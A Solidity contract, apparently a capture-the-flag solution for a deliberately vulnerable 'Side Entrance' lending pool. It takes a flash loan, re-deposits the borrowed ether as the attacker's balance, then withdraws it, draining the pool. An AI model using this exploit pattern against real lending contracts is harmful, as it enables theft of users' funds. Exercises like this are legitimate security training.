// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

import "@openzeppelin/contracts/utils/Address.sol";

contract BadContract is IFlashLoanEtherReceiver {
    using Address for address payable;

    address payable poolAddr;
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        poolAddr = payable(_pool);
        pool = SideEntranceLenderPool(_pool);
    }
    function attack(uint256 amount) public {
        pool.flashLoan(amount);
    }

    function withdraw() public {
        pool.withdraw();
        uint256 amount = address(this).balance;
        payable(msg.sender).sendValue(amount);
    }

    function execute() external payable override{
        uint256 amount = msg.value;
        poolAddr.functionCallWithValue(
            abi.encodeWithSignature(
                "deposit()"),
                amount);
    }

    receive () external payable{
        
    }
}